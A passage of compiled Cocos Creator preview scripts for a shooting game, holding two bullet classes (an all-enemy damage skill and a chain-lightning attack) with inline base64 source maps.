FJLE1BQU0sR0FBRyx5QkFBVyxDQUFDLGFBQWEsQ0FBQyxpQ0FBZSxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO1FBQ2xFLElBQUksQ0FBQyxJQUFJLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQyxNQUFNLENBQUMsTUFBTSxDQUFDLEdBQUMsYUFBSyxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsU0FBUyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxDQUFDO0lBQ3BGLENBQUM7SUFmZ0Isc0JBQXNCO1FBRDFDLE9BQU87T0FDYSxzQkFBc0IsQ0FnQjFDO0lBQUQsNkJBQUM7Q0FoQkQsQUFnQkMsQ0FoQm1ELGdCQUFNLEdBZ0J6RDtrQkFoQm9CLHNCQUFzQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQnVsbGV0IGZyb20gXCIuL0J1bGxldFwiO1xyXG5pbXBvcnQge0V4Y2VsQ29uZmlnfSBmcm9tIFwiLi4vLi4vLi4vLi4vZnJhbWV3b3JrL2NvbmZpZy9FeGNlbENvbmZpZ1wiO1xyXG5pbXBvcnQge0V4Y2VsVGFibGVOYW1lc30gZnJvbSBcIi4uLy4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uLy4uL2luZm8vV29ybGRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0T2ZYdWFuRmVuZ0h1b1BhbyBleHRlbmRzIEJ1bGxldCB7XHJcblxyXG5cclxuICAgIHN0cmlrZShvdGhlciwgc2VsZik6IHZvaWQge1xyXG4gICAgICAgIC8vIHN1cGVyLnN0cmlrZShvdGhlciwgc2VsZik7XHJcbiAgICB9XHJcblxyXG4gICAgaW5pdChpZDogbnVtYmVyKTogdm9pZCB7XHJcbiAgICAgICAgdGhpcy5idWxsZXRJZCA9IGlkO1xyXG4gICAgICAgIGxldCBjZmcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5Qcm9wKVt0aGlzLmJ1bGxldElkLTFdO1xyXG4gICAgICAgIHRoaXMuYlRocm91Z2h0ID0gY2ZnWydwaWVyY2UnXSA9PT0gMTtcclxuICAgICAgICB0aGlzLnJlcGVsID0gY2ZnWydyZXBlbCddO1xyXG4gICAgICAgIHRoaXMuc3RpZmYgPSBjZmdbJ3N0aWZmJ107XHJcbiAgICAgICAgbGV0IGNvbmZpZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvbilbMF07XHJcbiAgICAgICAgdGhpcy5odXJ0ID0gTWF0aC5mbG9vcihjb25maWdbJ2h1cnQnXSpXb3JsZC5NeS5hcm1vcnkuaHVydE11bE9mKDEpKSpjZmdbJ2h1cnQnXTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletOfJianGuangSi.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c0d80OY65BAjLn62n5cq+8P', 'BulletOfJianGuangSi');
// script/app/entities/bullet/BulletOfJianGuangSi.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var World_1 = require("../../info/World");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletOfJianGuangSi = /** @class */ (function (_super) {
    __extends(BulletOfJianGuangSi, _super);
    function BulletOfJianGuangSi() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._ske = null;
        return _this;
    }
    BulletOfJianGuangSi.prototype.init = function (id) {
        this.bulletId = id;
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Prop)[this.bulletId - 1];
        this.bThrought = cfg['pierce'] === 1;
        this.repel = cfg['repel'];
        this.stiff = cfg['stiff'];
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[0];
        this.hurt = Math.floor(config['hurt'] * World_1.World.My.armory.hurtMulOf(1)) * cfg['hurt'];
    };
    BulletOfJianGuangSi.prototype.onLoad = function () {
        var _this = this;
        _super.prototype.onLoad.call(this);
        this._ske = this.getComponent(sp.Skeleton);
        this._ske.setCompleteListener(function (trackEntry, loopCount) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            _this.node.active = false;
        });
    };
    BulletOfJianGuangSi.prototype.onCollisionEnter = function (other, self) {
    };
    BulletOfJianGuangSi.prototype.execute = function () {
        var _this = this;
        this._ske.setAnimation(0, "614", false);
        this.node.runAction(cc.sequence(cc.delayTime(2), cc.callFunc(function () {
            /** 对所有敌人造成伤害 */
            // console.log("对所有敌人造成伤害");
            window['GameEnemysController'].allAliveEnemy().forEach(function (value) { return value.hp -= _this.hurt; });
        })));
    };
    BulletOfJianGuangSi = __decorate([
        ccclass
    ], BulletOfJianGuangSi);
    return BulletOfJianGuangSi;
}(Bullet_1.default));
exports.default = BulletOfJianGuangSi;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZkppYW5HdWFuZ1NpLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxtQ0FBOEI7QUFFOUIsMENBQXVDO0FBQ3ZDLHdFQUFxRTtBQUNyRSxnRUFBNkQ7QUFFdkQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBaUQsdUNBQU07SUFBdkQ7UUFBQSxxRUFxQ0M7UUFuQ1csVUFBSSxHQUFlLElBQUksQ0FBQzs7SUFtQ3BDLENBQUM7SUFoQ0csa0NBQUksR0FBSixVQUFLLEVBQVU7UUFDWCxJQUFJLENBQUMsUUFBUSxHQUFHLEVBQUUsQ0FBQztRQUNuQixJQUFJLEdBQUcsR0FBRyx5QkFBVyxDQUFDLGFBQWEsQ0FBQyxpQ0FBZSxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUMsQ0FBQyxDQUFDLENBQUM7UUFDM0UsSUFBSSxDQUFDLFNBQVMsR0FBRyxHQUFHLENBQUMsUUFBUSxDQUFDLEtBQUssQ0FBQyxDQUFDO1FBQ3JDLElBQUksQ0FBQyxLQUFLLEdBQUcsR0FBRyxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQzFCLElBQUksQ0FBQyxLQUFLLEdBQUcsR0FBRyxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQzFCLElBQUksTUFBTSxHQUFHLHlCQUFXLENBQUMsYUFBYSxDQUFDLGlDQUFlLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDbEUsSUFBSSxDQUFDLElBQUksR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsR0FBQyxhQUFLLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxTQUFTLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBQyxHQUFHLENBQUMsTUFBTSxDQUFDLENBQUM7SUFDcEYsQ0FBQztJQUdELG9DQUFNLEdBQU47UUFBQSxpQkFPQztRQU5HLGlCQUFNLE1BQU0sV0FBRSxDQUFDO1FBQ2YsSUFBSSxDQUFDLElBQUksR0FBRyxJQUFJLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsQ0FBQztRQUMzQyxJQUFJLENBQUMsSUFBSSxDQUFDLG1CQUFtQixDQUFDLFVBQUMsVUFBVSxFQUFFLFNBQVM7WUFDaEQsSUFBSSxJQUFJLEdBQUcsVUFBVSxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUMsVUFBVSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQztZQUNqRSxLQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDN0IsQ0FBQyxDQUFDLENBQUM7SUFDUCxDQUFDO0lBR0QsOENBQWdCLEdBQWhCLFVBQWlCLEtBQUssRUFBRSxJQUFJO0lBQzVCLENBQUM7SUFFRCxxQ0FBTyxHQUFQO1FBQUEsaUJBT0M7UUFORyxJQUFJLENBQUMsSUFBSSxDQUFDLFlBQVksQ0FBQyxDQUFDLEVBQUUsS0FBSyxFQUFFLEtBQUssQ0FBQyxDQUFDO1FBQ3hDLElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDO1lBQ3pELGdCQUFnQjtZQUNoQiw0QkFBNEI7WUFDNUIsTUFBTSxDQUFDLHNCQUFzQixDQUFDLENBQUMsYUFBYSxFQUFFLENBQUMsT0FBTyxDQUFDLFVBQUEsS0FBSyxJQUFFLE9BQUEsS0FBSyxDQUFDLEVBQUUsSUFBSSxLQUFJLENBQUMsSUFBSSxFQUFyQixDQUFxQixDQUFDLENBQUM7UUFDekYsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0lBQ1QsQ0FBQztJQXBDZ0IsbUJBQW1CO1FBRHZDLE9BQU87T0FDYSxtQkFBbUIsQ0FxQ3ZDO0lBQUQsMEJBQUM7Q0FyQ0QsQUFxQ0MsQ0FyQ2dELGdCQUFNLEdBcUN0RDtrQkFyQ29CLG1CQUFtQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQnVsbGV0IGZyb20gXCIuL0J1bGxldFwiO1xyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi8uLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZVwiO1xyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQge0V4Y2VsQ29uZmlnfSBmcm9tIFwiLi4vLi4vLi4vLi4vZnJhbWV3b3JrL2NvbmZpZy9FeGNlbENvbmZpZ1wiO1xyXG5pbXBvcnQge0V4Y2VsVGFibGVOYW1lc30gZnJvbSBcIi4uLy4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0T2ZKaWFuR3VhbmdTaSBleHRlbmRzIEJ1bGxldCB7XHJcblxyXG4gICAgcHJpdmF0ZSBfc2tlOnNwLlNrZWxldG9uID0gbnVsbDtcclxuXHJcblxyXG4gICAgaW5pdChpZDogbnVtYmVyKTogdm9pZCB7XHJcbiAgICAgICAgdGhpcy5idWxsZXRJZCA9IGlkO1xyXG4gICAgICAgIGxldCBjZmcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5Qcm9wKVt0aGlzLmJ1bGxldElkLTFdO1xyXG4gICAgICAgIHRoaXMuYlRocm91Z2h0ID0gY2ZnWydwaWVyY2UnXSA9PT0gMTtcclxuICAgICAgICB0aGlzLnJlcGVsID0gY2ZnWydyZXBlbCddO1xyXG4gICAgICAgIHRoaXMuc3RpZmYgPSBjZmdbJ3N0aWZmJ107XHJcbiAgICAgICAgbGV0IGNvbmZpZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvbilbMF07XHJcbiAgICAgICAgdGhpcy5odXJ0ID0gTWF0aC5mbG9vcihjb25maWdbJ2h1cnQnXSpXb3JsZC5NeS5hcm1vcnkuaHVydE11bE9mKDEpKSpjZmdbJ2h1cnQnXTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgb25Mb2FkKCk6IHZvaWQge1xyXG4gICAgICAgIHN1cGVyLm9uTG9hZCgpO1xyXG4gICAgICAgIHRoaXMuX3NrZSA9IHRoaXMuZ2V0Q29tcG9uZW50KHNwLlNrZWxldG9uKTtcclxuICAgICAgICB0aGlzLl9za2Uuc2V0Q29tcGxldGVMaXN0ZW5lcigodHJhY2tFbnRyeSwgbG9vcENvdW50KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBuYW1lID0gdHJhY2tFbnRyeS5hbmltYXRpb24gPyB0cmFja0VudHJ5LmFuaW1hdGlvbi5uYW1lIDogJyc7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgb25Db2xsaXNpb25FbnRlcihvdGhlciwgc2VsZik6IHZvaWQge1xyXG4gICAgfVxyXG5cclxuICAgIGV4ZWN1dGUoKXtcclxuICAgICAgICB0aGlzLl9za2Uuc2V0QW5pbWF0aW9uKDAsIFwiNjE0XCIsIGZhbHNlKTtcclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgyKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgLyoqIOWvueaJgOacieaVjOS6uumAoOaIkOS8pOWusyAqL1xyXG4gICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIuWvueaJgOacieaVjOS6uumAoOaIkOS8pOWus1wiKTtcclxuICAgICAgICAgICAgd2luZG93WydHYW1lRW5lbXlzQ29udHJvbGxlciddLmFsbEFsaXZlRW5lbXkoKS5mb3JFYWNoKHZhbHVlPT52YWx1ZS5ocCAtPSB0aGlzLmh1cnQpO1xyXG4gICAgICAgIH0pKSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletOfLighting.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '5a245PWUhJNNYI42/j5E9XP', 'BulletOfLighting');
// script/app/entities/bullet/BulletOfLighting.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var Enemy_1 = require("../enemy/Enemy");
var World_1 = require("../../info/World");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletOfLighting = /** @class */ (function (_super) {
    __extends(BulletOfLighting, _super);
    function BulletOfLighting() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._ske = null;
        _this._lightEnemys = [];
        return _this;
    }
    BulletOfLighting.prototype.onDisable = function () {
        _super.prototype.onDisable.call(this);
        this._lightEnemys.length = 0;
    };
    BulletOfLighting.prototype.strike = function (other, self) {
        var gameBulletsController = window['GameBulletsController'];
        this._lightEnemys.push(other.getComponent(Enemy_1.default));
        var bulletStrike = gameBulletsController.getInactiveBulletStrike(10);
        bulletStrike.node.active = true;
        bulletStrike.node.position = cc.v2();
        bulletStrike.node.rotation = this.node.rotation;
        bulletStrike.node.setContentSize(other.node.getContentSize());
        bulletStrike.node.removeFromParent(false);
        bulletStrike.node.setParent(other.node);
        var spriteNode = bulletStrike.spriteNode;
        bulletStrike.node.rotation = Math.random() * 360;
        bulletStrike.node.runAction(cc.sequence(cc.repeat(cc.sequence(cc.delayTime(0.05), cc.callFunc(function () {
            spriteNode.active = !spriteNode.active;
            // bulletStrike.node.rotation = Math.random()*360;
        })), 6), cc.callFunc(function () {
            bulletStrike.node.stopAllActions();
            bulletStrike.node.active = false;
            bulletStrike.node.removeFromParent(false);
            bulletStrike.node.setParent(gameBulletsController.bulletLayer);
        })));
    };
    BulletOfLighting.prototype.init = function (id) {
        this.bulletId = id;
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Prop)[this.bulletId - 1];
        this.bThrought = cfg['pierce'] === 1;
        this.repel = cfg['repel'];
        this.stiff = cfg['stiff'];
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[0];
        this.hurt = Math.floor(config['hurt'] * World_1.World.My.armory.hurtMulOf(1)) * cfg['hurt'];
    };
    BulletOfLighting.prototype.onLoad = function () {
        var _this = this;
        _super.prototype.onLoad.call(this);
        this._ske = this.getComponent(sp.Skeleton);
        this._ske.setCompleteListener(function (trackEntry, loopCount) {
            var _a;
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            /** 寻找新的怪物攻击 */
            /** 找最近的怪生成闪电 */
            if (_this._lightEnemys.length > 0 && _this._lightEnemys.length < 6) {
                var list = window['GameEnemysController'].allAliveAndInScreenEnemy().filter(function (value) { return !_this._lightEnemys.includes(value); });
                if (list.length > 0) {
                    var minDistance_1 = -1;
                    var enemy_1 = null;
                    list.forEach(function (value) {
                        var distance = _this.node.position.sub(value.node.position).mag();
                        if (minDistance_1 < 0 || distance < minDistance_1) {
                            minDistance_1 = distance;
                            enemy_1 = value;
                        }
                    });
                    /** 生成闪电 */
                    var bullet = window['GameBulletsController'].getInactivePropBullet(6);
                    bullet.node.position = _this._lightEnemys[_this._lightEnemys.length - 1].node.position;
                    (_a = bullet._lightEnemys).push.apply(_a, _this._lightEnemys);
                    bullet.joint(enemy_1.node.position);
                }
            }
            _this.node.active = false;
        });
    };
    BulletOfLighting.prototype.joint = function (pos) {
        var sub = pos.sub(this.node.position);
        var distance = sub.mag();
        this.node.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(sub.y, sub.x));
        this.node.scaleY = distance / 380;
        this.node.active = true;
        this._ske.setAnimation(0, "animation", false);
    };
    BulletOfLighting = __decorate([
        ccclass
    ], BulletOfLighting);
    return BulletOfLighting;
}(Bullet_1.default));
exports.default = BulletOfLighting;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZkxpZ2h0aW5nLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxtQ0FBOEI7QUFFOUIsd0NBQW1DO0FBQ25DLDBDQUF1QztBQUN2Qyx3RUFBcUU7QUFDckUsZ0VBQTZEO0FBRXZELElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQThDLG9DQUFNO0lBQXBEO1FBQUEscUVBMkZDO1FBekZXLFVBQUksR0FBZSxJQUFJLENBQUM7UUFFeEIsa0JBQVksR0FBZ0IsRUFBRSxDQUFDOztJQXVGM0MsQ0FBQztJQXBGRyxvQ0FBUyxHQUFUO1FBQ0ksaUJBQU0sU0FBUyxXQUFFLENBQUM7UUFDbEIsSUFBSSxDQUFDLFlBQVksQ0FBQyxNQUFNLEdBQUcsQ0FBQyxDQUFDO0lBQ2pDLENBQUM7SUFFRCxpQ0FBTSxHQUFOLFVBQU8sS0FBSyxFQUFFLElBQUk7UUFDZCxJQUFJLHFCQUFxQixHQUFHLE1BQU0sQ0FBQyx1QkFBdUIsQ0FBQyxDQUFDO1FBQzVELElBQUksQ0FBQyxZQUFZLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxZQUFZLENBQUMsZUFBSyxDQUFDLENBQUMsQ0FBQztRQUNsRCxJQUFJLFlBQVksR0FBRyxxQkFBcUIsQ0FBQyx1QkFBdUIsQ0FBQyxFQUFFLENBQUMsQ0FBQztRQUNyRSxZQUFZLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7UUFDaEMsWUFBWSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsRUFBRSxDQUFDLEVBQUUsRUFBRSxDQUFDO1FBQ3JDLFlBQVksQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDO1FBQ2hELFlBQVksQ0FBQyxJQUFJLENBQUMsY0FBYyxDQUFDLEtBQUssQ0FBQyxJQUFJ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